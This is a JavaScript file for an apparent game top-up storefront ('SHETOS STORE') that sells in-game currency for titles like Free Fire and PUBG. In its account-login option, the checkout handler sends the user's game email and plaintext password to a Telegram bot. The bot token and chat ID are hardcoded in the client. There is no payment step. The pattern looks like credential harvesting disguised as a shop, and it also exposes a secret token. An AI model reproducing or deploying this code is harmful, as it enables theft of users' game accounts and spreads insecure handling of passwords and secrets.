document.addEventListener('DOMContentLoaded', () => {
    // ===== CONFIG =====
    const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I";
    const TELEGRAM_CHAT_ID = "8851363543";

    // ===== CURSOR =====
    const cursor = document.getElementById('cursor');
    const cursorRing = document.getElementById('cursor-ring');
    let cx = 0, cy = 0, rx = 0, ry = 0;

    document.addEventListener('mousemove', e => {
        cx = e.clientX; cy = e.clientY;
        cursor.style.left = cx + 'px';
        cursor.style.top = cy + 'px';
    });

    (function animateCursorRing() {
        rx += (cx - rx) * 0.12;
        ry += (cy - ry) * 0.12;
        cursorRing.style.left = rx + 'px';
        cursorRing.style.top = ry + 'px';
        requestAnimationFrame(animateCursorRing);
    })();

    // ===== ELEMENTS =====
    const landingPage = document.getElementById('landing-page');
    const storePage = document.getElementById('store-page');
    const enterBtn = document.getElementById('enter-btn');
    const pageTransition = document.getElementById('page-transition');
    const transitionLogo = pageTransition.querySelector('.transition-logo');

    const gameModal = document.getElementById('game-modal');
    const rechargeModal = document.getElementById('recharge-modal');
    const checkoutModal = document.getElementById('checkout-modal');
    const rechargeList = document.querySelector('.recharge-list');
    const modalTitle = document.getElementById('modal-game-title');
    const modalIcon = document.getElementById('modal-game-icon');
    const toggleContainer = document.getElementById('modal-toggle-container');
    const btnId = document.getElementById('btn-id');
    const btnAcc = document.getElementById('btn-acc');
    const idGroup = document.getElementById('id-input-group');
    const accGroup = document.getElementById('acc-input-group');
    const idField = document.getElementById('game-id-field');
    const emailField = document.getElementById('acc-email-field');
    const passField = document.getElementById('acc-pass-field');
    const confirmBtn = document.getElementById('confirm-btn');
    const checkoutActionContainer = document.getElementById('checkout-action-container');
    const successNotification = document.getElementById('success-notification');

    let currentGame = "";
    let currentMethod = "ID";
    let orderData = { user: "", rawId: "", email: "", password: "", product: "", price: "" };

    const themes = {
        "FREE FIRE":    { color: "#ff6a00", accent: "#ff9a00", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRajrChmCmo3a8iH0c_xnQfL7J5BWAbUg9X2A&s" },
        "PUBG":         { color: "#00b4ff", accent: "#007acc", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
        "CALL OF DUTY": { color: "#e5c158", accent: "#c29d38", icon: "https://static.wikia.nocookie.net/callofduty/images/3/31/CODMobile_App_Icon_Global_2024_Season10_CODM.png/revision/latest/scale-to-width-down/250?cb=20241105161610" },
        "FIFA MOBILE":  { color: "#00ffaa", accent: "#00ccaa", icon: "https://cdn-www.bluestacks.com/bs-images/70042468c0d43639228178f9e61aec7f.png" },
        "PES MOBILE":   { color: "#00cc44", accent: "#009933", icon: "https://cdn-offer-photos.zeusx.com/b12a0ebf-889c-4053-9c53-3f756e8602d1.png" },
        "BLOOD STRIKE": { color: "#ff2244", accent: "#cc0000", icon: "https://www.blood-strike.com/m/gw/20230721092756/data/share.jpg" }
    };

    // ===== PAGE TRANSITION =====
    enterBtn.addEventListener('click', () => {
        pageTransition.style.opacity = '1';
        pageTransition.style.transition = 'opacity 0.4s ease';
        pageTransition.classList.add('active');

        // Animate logo
        transitionLogo.style.transition = 'opacity 0.3s ease 0.15s, transform 0.5s cubic-bezier(0.34,1.56,0.64,1) 0.1s';
        transitionLogo.style.opacity = '1';
        transitionLogo.style.transform = 'scale(1.05)';

        setTimeout(() => {
            landingPage.classList.remove('active');
            storePage.classList.add('active');
            routeTabView('#home');

            setTimeout(() => {
                pageTransition.style.opacity = '0';
                setTimeout(() => {
                    pageTransition.classList.remove('active');
                    transitionLogo.style.opacity = '0';
                    transitionLogo.style.transform = 'scale(0.95)';
                }, 400);
                storePage.classList.add('revealed');
            }, 300);
        }, 700);
    });

    // ===== NAV =====
    const navLinks = document.querySelectorAll('.nav-link');
    navLinks.forEach(link => {
        link.addEventListener('click', e => {
            e.preventDefault();
            const hash = link.getAttribute('href');
            document.querySelectorAll('.nav-links li').forEach(li => li.classList.remove('active'));
            link.closest('li').classList.add('active');
            routeTabView(hash);
        });
    });

    function routeTabView(hash) {
        document.querySelectorAll('.tab-content-view').forEach(v => v.classList.remove('active-view'));
        if (hash === '#home') document.getElementById('home-content-section').classList.add('active-view');
        else if (hash === '#search') {
            document.getElementById('search-content-section').classList.add('active-view');
            document.getElementById('store-search-input').value = '';
            processSearch('');
        }
        else if (hash === '#about') document.getElementById('about-content-section').classList.add('active-view');
        else if (hash === '#support') document.getElementById('support-content-section').classList.add('active-view');
    }

    // ===== SEARCH =====
    const searchInput = document.getElementById('store-search-input');
    const searchResultsViewport = document.getElementById('search-results-viewport');

    searchInput.addEventListener('input', e => processSearch(e.target.value));

    function processSearch(query) {
        const q = query.trim().toLowerCase();
        searchResultsViewport.innerHTML = '';

        if (!q) {
            searchResultsViewport.innerHTML = '<div class="search-hint">Start typing to find a game...</div>';
            return;
        }

        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
        let count = 0;

        sourceCards.forEach(card => {
            const name = card.getAttribute('data-game-search-title') || '';
            if (name.includes(q)) {
                count++;
                const clone = card.cloneNode(true);
                clone.style.animation = 'cardReveal 0.4s ease both';
                clone.addEventListener('click', () => {
                    if (name.includes('free fire')) configureModal('FREE FIRE');
                    if (name.includes('pubg')) configureModal('PUBG');
                    if (name.includes('call of duty')) configureModal('CALL OF DUTY');
                    if (name.includes('fifa')) configureModal('FIFA MOBILE');
                    if (name.includes('pes')) configureModal('PES MOBILE');
                    if (name.includes('blood strike')) configureModal('BLOOD STRIKE');
                });
                searchResultsViewport.appendChild(clone);
            }
        });

        if (count === 0) {
            searchResultsViewport.innerHTML = '<div class="not-found-feedback">NOT FOUND</div>';
        }
    }

    // ===== PRODUCT DATA =====
    const products = {
        "FREE FIRE": {
            ID: [
                { name: '◇ 100 Diamond', price: '55 EGP' },
                { name: '◇ 210 Diamond', price: '105 EGP' },
                { name: '◇ 310 Diamond', price: '155 EGP' },
                { name: '◇ 420 Diamond', price: '205 EGP' },
                { name: '◇ 520 Diamond', price: '255 EGP' },
                { name: '★ Weekly Membership', price: '105 EGP', member: true },
                { name: '★ Monthly Membership', price: '540 EGP', member: true },
                { name: '◇ 750 Diamond [اسبوعي +300]', price: '265 EGP', sale: true },
                { name: '◇ 1050 Diamond [اسبوعي +600]', price: '420 EGP', sale: true },
                { name: '◇ 1450 Diamond [اسبوعي +1000]', price: '660 EGP', sale: true },
            ],
            ACC: [
                { name: '◇ 100 Diamond Bonus', price: '50 EGP' },
                { name: '◇ 210 Diamond', price: '95 EGP' },
                { name: '◇ 310 Diamond', price: '140 EGP' },
                { name: '◇ 400 Diamond', price: '180 EGP' },
                { name: '◇ 500 Diamond', price: '225 EGP' },
                { name: '◇ 600 Diamond', price: '305 EGP' },
                { name: '◇ 700 Diamond', price: '355 EGP' },
                { name: '★ Weekly Membership', price: '75 EGP', member: true },
                { name: '★ Monthly Membership', price: '430 EGP', member: true },
                { name: '◇ 750 Diamond [اسبوعي +300]', price: '220 EGP', sale: true },
                { name: '◇ 1050 Diamond [اسبوعي +600]', price: '330 EGP', sale: true },
                { name: '◇ 1450 Diamond [اسبوعي +1000]', price: '430 EGP', sale: true },
            ]
        },
        "PUBG": { ID: [
            { name: '◇ 30 UC', price: '25 EGP' },
            { name: '◇ 60 UC', price: '45 EGP' },
            { name: '◇ 325 UC', price: '215 EGP' },
            { name: '◇ 660 UC', price: '425 EGP' },
            { name: '◇ 1800 UC', price: '1055 EGP' },
            { name: '★ LVL (1 - 50)', price: '255 EGP', member: true },
            { name: '★ LVL (1 - 100)', price: '510 EGP', member: true },
        ]},
        "CALL OF DUTY": { ID: [
            { name: '◇ 30 CP', price: '20 EGP' },
            { name: '◇ 80 CP', price: '50 EGP' },
            { name: '◇ 420 CP', price: '230 EGP' },
            { name: '◇ 880 CP', price: '455 EGP' },
            { name: '◇ 2400 CP', price: '1130 EGP' },
            { name: '★ Battle Pass Premium', price: '130 EGP', member: true },
        ]},
        "FIFA MOBILE": { ID: [
            { name: '◇ 40 FC Points', price: '25 EGP' },
            { name: '◇ 100 FC Points', price: '55 EGP' },
            { name: '◇ 520 FC Points', price: '255 EGP' },
            { name: '◇ 1070 FC Points', price: '505 EGP' },
        ]},
        "PES MOBILE": { ID: [
            { name: '◇ 137 Coins', price: '70 EGP' },
            { name: '◇ 315 Coins', price: '155 EGP' },
            { name: '◇ 578 Coins', price: '265 EGP' },
            { name: '◇ 788 Coins', price: '355 EGP' },
            { name: '◇ 1092 Coins', price: '485 EGP' },
            { name: '★ Heroic Pass', price: '260 EGP', member: true },
        ]},
        "BLOOD STRIKE": { ID: [
            { name: '◇ 51 Gold', price: '30 EGP' },
            { name: '◇ 105 Gold', price: '55 EGP' },
            { name: '◇ 320 Gold', price: '150 EGP' },
            { name: '◇ 540 Gold', price: '250 EGP' },
            { name: '◇ 1100 Gold', price: '495 EGP' },
        ]},
    };

    // ===== MODAL CONFIG =====
    function configureModal(gameKey) {
        currentGame = gameKey;
        const theme = themes[gameKey];

        modalTitle.textContent = gameKey;
        modalTitle.style.color = theme.color;
        modalIcon.src = theme.icon;
        modalIcon.style.borderColor = theme.color;

        toggleContainer.style.display = gameKey === 'FREE FIRE' ? 'flex' : 'none';

        idField.value = ''; emailField.value = ''; passField.value = '';
        switchToID();
        gameModal.classList.add('active');
    }

    // Card clicks
    document.querySelectorAll('#home-content-section .game-card').forEach(card => {
        card.addEventListener('click', () => {
            const t = card.getAttribute('data-game-search-title');
            if (t.includes('free fire')) configureModal('FREE FIRE');
            else if (t.includes('pubg')) configureModal('PUBG');
            else if (t.includes('call of duty')) configureModal('CALL OF DUTY');
            else if (t.includes('fifa')) configureModal('FIFA MOBILE');
            else if (t.includes('pes')) configureModal('PES MOBILE');
            else if (t.includes('blood strike')) configureModal('BLOOD STRIKE');
        });
    });

    // Modal close
    document.getElementById('close-modal').addEventListener('click', () => gameModal.classList.remove('active'));
    document.getElementById('back-to-id').addEventListener('click', () => { rechargeModal.classList.remove('active'); gameModal.classList.add('active'); });
    document.getElementById('back-to-recharge').addEventListener('click', () => { checkoutModal.classList.remove('active'); rechargeModal.classList.add('active'); });

    // Toggle
    function switchToID() {
        currentMethod = 'ID';
        btnId.classList.add('active'); btnAcc.classList.remove('active');
        idGroup.style.display = 'block'; accGroup.style.display = 'none';
        validateInputs();
    }
    function switchToACC() {
        currentMethod = 'ACC';
        btnAcc.classList.add('active'); btnId.classList.remove('active');
        idGroup.style.display = 'none'; accGroup.style.display = 'block';
        validateInputs();
    }
    btnId.addEventListener('click', switchToID);
    btnAcc.addEventListener('click', switchToACC);

    function validateInputs() {
        const valid = currentMethod === 'ID'
            ? idField.value.trim().length > 4
            : emailField.value.trim().length > 4 && passField.value.trim().length > 2;

        confirmBtn.disabled = !valid;
        if (valid) {
            confirmBtn.classList.add('active-style');
            confirmBtn.style.background = `linear-gradient(135deg, ${themes[currentGame].color}, ${themes[currentGame].accent})`;
        } else {
            confirmBtn.classList.remove('active-style');
            confirmBtn.style.background = '';
        }
    }

    idField.addEventListener('input', validateInputs);
    emailField.addEventListener('input', validateInputs);
    passField.addEventListener('input', validateInputs);

    // Confirm button → show products
    confirmBtn.addEventListener('click', () => {
        if (confirmBtn.disabled) return;

        if (currentMethod === 'ID') {
            orderData.rawId = idField.value.trim();
            orderData.user = idField.value.trim();
            orderData.email = ''; orderData.password = '';
        } else {
            orderData.email = emailField.value.trim();
            orderData.password = passField.value.trim();
            orderData.user = emailField.value.trim();
            orderData.rawId = '';
        }

        buildRechargeList();
        gameModal.classList.remove('active');
        rechargeModal.classList.add('active');
    });

    function buildRechargeList() {
        rechargeList.innerHTML = '';
        const theme = themes[currentGame];
        const list = (currentGame === 'FREE FIRE') ? products[currentGame][currentMethod] : (products[currentGame]?.ID || []);

        let hasSale = list.some(p => p.sale);
        let saleHeaderAdded = false;

        list.forEach((p, i) => {
            if (p.sale && !saleHeaderAdded) {
                const lbl = document.createElement('div');
                lbl.className = 'recharge-section-label';
                lbl.textContent = '🔔 SPECIAL DEALS';
                rechargeList.appendChild(lbl);
                saleHeaderAdded = true;
            }

            const item = document.createElement('div');
            item.className = 'recharge-item' + (p.member ? ' membership' : '');
            item.style.setProperty('--card-color', theme.color);
            item.innerHTML = `<span class="item-name">${p.name}</span><span class="item-price">${p.price}</span>`;
            item.style.animationDelay = (i * 0.04) + 's';
            item.style.animation = 'cardReveal 0.4s ease both';

            item.addEventListener('click', () => {
                orderData.product = p.name;
                orderData.price = p.price;
                buildCheckout();
                rechargeModal.classList.remove('active');
                checkoutModal.classList.add('active');
            });

            rechargeList.appendChild(item);
        });
    }

    function buildCheckout() {
        const el = document.getElementById('order-details');
        let html = `<div><strong>GAME</strong> &nbsp; ${currentGame}</div>`;
        if (orderData.rawId) html += `<div><strong>ID</strong> &nbsp; ${orderData.rawId}</div>`;
        if (orderData.email) html += `<div><strong>EMAIL</strong> &nbsp; ${orderData.email}</div>`;
        html += `<div><strong>PRODUCT</strong> &nbsp; ${orderData.product}</div>`;
        html += `<div><strong>PRICE</strong> &nbsp; <span style="color:var(--clr-orange2)">${orderData.price}</span></div>`;
        el.innerHTML = html;
        successNotification.style.display = 'none';
        checkoutActionContainer.innerHTML = '<button id="checkout-btn">CHECKOUT</button>';
        document.getElementById('checkout-btn').addEventListener('click', handleCheckout);
    }

    function handleCheckout() {
        const msg = `🎮 NEW ORDER — SHETOS STORE\n\nGame: ${currentGame}\nMethod: ${currentMethod}\n${orderData.rawId ? 'ID: ' + orderData.rawId : 'Email: ' + orderData.email + '\nPass: ' + orderData.password}\nProduct: ${orderData.product}\nPrice: ${orderData.price}`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg })
        }).catch(() => {});

        successNotification.style.display = 'block';
        checkoutActionContainer.innerHTML = '<div class="done-status-block">✓ ORDER SENT</div>';
    }

    // ===== FEEDBACK =====
    document.getElementById('feedback-submit-btn').addEventListener('click', () => {
        const text = document.getElementById('feedback-textarea-field').value.trim();
        if (!text) return;

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `💬 Feedback: ${text}` })
        }).catch(() => {});

        document.getElementById('feedback-input-box').style.display = 'none';
        document.getElementById('feedback-thanks-box').style.display = 'block';
    });

});
